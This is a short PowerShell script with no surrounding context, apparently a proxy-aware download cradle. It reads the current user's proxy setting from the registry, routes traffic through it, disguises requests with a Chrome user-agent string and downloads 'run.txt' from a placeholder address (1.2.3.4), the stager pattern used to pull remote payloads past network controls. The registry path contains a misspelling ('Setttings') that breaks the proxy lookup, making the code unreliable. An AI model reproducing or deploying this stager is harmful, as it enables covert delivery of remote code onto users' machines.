New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
$keys = Get-ChildItem 'HKU:\'
ForEach ($key in $keys) { if ($key.Name -like "*S-1-5-21-*") {$start = $key.Name.Substring(10); break}}
$proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Setttings\").ProxyServer
[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://$proxyAddr")
$wc = new-object system.net.WebClient
$wc.Headers.Add('User-Agent', "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36")
$wc.DownloadString("http://1.2.3.4/run.txt")
